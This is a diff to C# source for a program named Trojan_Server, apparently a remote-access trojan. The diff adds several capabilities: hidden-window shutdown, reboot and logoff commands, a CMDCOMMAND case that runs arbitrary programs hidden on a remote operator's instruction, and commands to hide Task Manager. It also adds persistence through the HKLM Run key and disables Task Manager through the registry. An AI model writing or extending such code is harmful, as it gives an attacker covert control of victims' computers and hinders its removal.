@@ -11,6 +11,9 @@ namespace Trojan_Server
 {
     class Program
     {
+        public Type typeShell=null;
+        public object objShell=Type.Missing;
+        
         private const int SWP_HIDEWINDOW = 0x80;
         private const int SWP_SHOWWINDOW = 0x40;
 
@@ -67,7 +70,7 @@ namespace Trojan_Server
                             System.Diagnostics.Process reboot = new System.Diagnostics.Process();
                             reboot.StartInfo.FileName = "shutdown";
                             reboot.StartInfo.Arguments = "-r -t " + RebootTime.Trim('\0');
-                            reboot.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
+                            reboot.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                             reboot.Start();
                             break;
                         case "SHUTDOWN":
@@ -75,8 +78,22 @@ namespace Trojan_Server
                             System.Diagnostics.Process shutdown = new System.Diagnostics.Process();
                             shutdown.StartInfo.FileName = "shutdown";
                             shutdown.StartInfo.Arguments = "-s -t " + ShutdownTime.Trim('\0');
-                            shutdown.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
+                            shutdown.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                             shutdown.Start();
+                            break;
+                        case "LOGOFF":
+                            System.Diagnostics.Process logoff = new System.Diagnostics.Process();
+                            logoff.StartInfo.FileName = "shutdown";
+                            logoff.StartInfo.Arguments = "/l";
+                            logoff.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                            logoff.Start();
+                            break;
+                        case "CMDCOMMAND":
+                            string CMDCommnd = CommandArray[1];
+                            System.Diagnostics.Process Cmd = new System.Diagnostics.Process();
+                            Cmd.StartInfo.FileName = CMDCommnd.Trim('\0');
+                            Cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                            Cmd.Start();
                             break;
                         case "HIDETASKBAR":
                             int TaskBarHwnd;
@@ -93,6 +110,12 @@ namespace Trojan_Server
                             break;
                         case "SHOWDESKTOPICONS":
                             ShowWindow(FindWindow("Progman", "Program Manager"), 1);
+                            break;
+						case "HIDETASKMANGER":
+                            ShowWindow(FindWindow("taskmgr", "Task Manager"), 0);
+                            break;
+                        case "SHOWTASKMANGER":
+                            ShowWindow(FindWindow("taskmgr", "Task Manager"), 1);
                             break;
                     }
                 }
@@ -128,12 +151,15 @@ namespace Trojan_Server
                 File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.System);
                 File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);
                 RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", RegistryValueKind.String);
+                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + "logonassistant.exe", RegistryValueKind.String);
                 k.Close();
+                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\Windows\CurrentVersion\Policies\System");
+                objRegistryKey.SetValue("DisableTaskMgr", "1");
+                objRegistryKey.Close();
             }
             catch
             {
-
+				System.Windows.Forms.MessageBox.Show("Error while Adding to Startup...", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
             }
             
         }
